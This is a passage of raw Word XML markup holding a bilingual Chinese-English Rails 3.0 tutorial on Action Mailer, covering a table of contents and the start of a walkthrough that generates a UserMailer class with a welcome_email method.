        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Action Mailer 介绍</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12AE7CF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这份文章能够让你了解如何用应用上手收发邮件，深入地了解 Action Mailer 组件，还介绍了测试自己邮件收发的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFDF151"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1F907D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId592" w:anchor="1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Introduction</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54F6B9A4" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId593" w:anchor="2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Sending Emails</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="183CA531" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId594" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Walkthrough to Generating a Mailer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="699A0FC1" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId595" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>多字节问题</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="565B5FD7" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId596" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action Mailer 方法全列表</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0A789732" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId597" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mailer Views</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F4D15B5" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId598" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mailer 布局文件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B46919A" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId599" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">在 Action Mailer 视图中生成 </w:t>
        </w:r>
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>URL</w:t>
        </w:r>
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D4C9A69" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId600" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>发送复合邮件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3ECC8357" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId601" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>发送带附件的邮件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46D7683D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId602" w:anchor="3" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>接收邮件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="50C6B883" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId603" w:anchor="4" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用 Action Mailer Helpers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72A156F3" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId604" w:anchor="5" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action Mailer 设置</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32918E8E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId605" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action Mailer 配置范例</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1516B52E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId606" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Action Mailer 和 GMail</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="23316627" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="258"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId607" w:anchor="6" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Mailer 测试</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3928A1B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WARNING 这份教程对应版本为3.0,在最新版本的Rails上跑或许会出现问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66D192A5"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1 Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F3AC9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Action Mailer allows you to send emails from your application using a mailer model and views. So, in Rails, emails are used by creating mailers that inherit from </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionMailer::Base</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and live in </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/mailers</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Those mailers have associated views that appear alongside controller views in </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F31F9B8"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2 Sending Emails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B45FD4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This section will provide a step-by-step guide to creating a mailer and its views.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771198BA"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2.1 Walkthrough to Generating a Mailer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791D09FC"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2.1.1 Create the Mailer</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2CDFF3DC" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A14F07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rails generate mailer UserMailer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="405A296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app/mailers/user_mailer.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DF306E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erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F5D4F8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app/views/user_mailer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49C1701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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CF6387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test/functional/user_mailer_test.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="269B0A3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So we got the mailer, the views, and the tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E41B9A"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2.1.2 Edit the Mailer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E03B63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app/mailers/user_mailer.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> contains an empty mailer:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4680"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="70AC4552" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F71481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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47E6C55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default :from</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "from@example.com"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B2C61A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1BEC576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Let’s add a method called </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>welcome_email</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, that will send an email to the user’s registered email address:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0913935B" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54E19A3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UserMailer &lt; ActionMailer::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DE6896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default :from</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
